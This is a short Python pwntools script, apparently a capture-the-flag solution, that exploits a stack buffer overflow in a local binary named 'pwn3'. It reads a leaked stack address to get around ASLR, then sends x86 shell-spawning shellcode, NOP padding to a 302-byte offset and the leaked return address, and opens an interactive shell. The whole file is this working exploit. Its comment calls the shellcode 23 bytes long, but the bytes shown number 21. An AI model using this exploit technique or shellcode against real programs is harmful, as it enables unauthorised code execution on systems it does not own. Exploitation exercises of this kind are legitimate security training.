#!/usr/bin/python3

#offset: 302 bytes
import pwn as p

start = p.process('./pwn3')
offset = 302

# Grab the mem address at run time <- abuse mem leak to counter ASLR
def getAddr():
    line = start.recvline().split()
    addr = str(line[-1])[2:-2]
    return addr

# Craft our exploit
def pwn():
    runTimeAddr = int(getAddr(), 16) #Convert exploit addr from string to hex addr
    shellcode = b'\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' # shellcode to pop a shell - 23 bytes in length
    print(len(shellcode))
    payload = shellcode + b'\x90'*(offset - len(shellcode)) + p.p32(runTimeAddr)
    start.sendline(payload) 
    start.interactive()

if __name__=="__main__":
    pwn()
